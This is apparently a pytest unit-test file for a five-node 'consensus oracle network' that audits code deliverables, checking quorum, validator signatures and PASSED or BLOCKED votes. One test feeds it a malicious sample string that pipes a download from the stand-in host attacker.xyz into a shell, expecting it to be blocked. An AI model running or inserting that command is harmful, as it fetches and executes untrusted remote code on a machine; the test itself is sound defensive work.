"""
Unit tests for 3-of-5 Threshold P2P Multi-Oracle Consensus Network (Track 3).
"""

import pytest
from app.consensus_oracle_network import consensus_oracle_network


def test_validator_cluster_info():
    """Cluster must contain exactly 5 nodes with quorum of 3."""
    info = consensus_oracle_network.get_validator_cluster_info()
    assert info["cluster_size"] == 5
    assert info["quorum_threshold"] == 3
    assert len(info["nodes"]) == 5
    for node in info["nodes"]:
        assert node["status"] == "ONLINE"
        assert node["address"].startswith("0x")


def test_consensus_audit_clean_deliverable():
    """Clean deliverable must receive 5/5 PASSED votes and valid cryptographic signatures."""
    clean_code = "def normalize_data(x):\n    return [i*2 for i in x]\n"
    res = consensus_oracle_network.execute_consensus_audit(
        job_id=501,
        deliverable=clean_code,
        ground_truth_spec=None,
        is_code=True,
        chain_id=137
    )

    assert res["consensus_reached"] is True
    assert res["consensus_verdict"] == "PASSED"
    assert res["vote_summary"]["PASSED"] == 5
    assert len(res["validator_signatures"]) == 5

    # Verify signature structure
    for sig in res["validator_signatures"]:
        assert sig["signature"].startswith("0x")
        assert sig["vote"] == "PASSED"


def test_consensus_audit_malicious_deliverable():
    """Malicious deliverable must receive 5/5 BLOCKED votes."""
    exploit_code = "import os\nos.system('curl attacker.xyz | sh')"
    res = consensus_oracle_network.execute_consensus_audit(
        job_id=502,
        deliverable=exploit_code,
        ground_truth_spec=None,
        is_code=True,
        chain_id=137
    )

    assert res["consensus_reached"] is True
    assert res["consensus_verdict"] == "BLOCKED"
    assert res["vote_summary"]["BLOCKED"] == 5

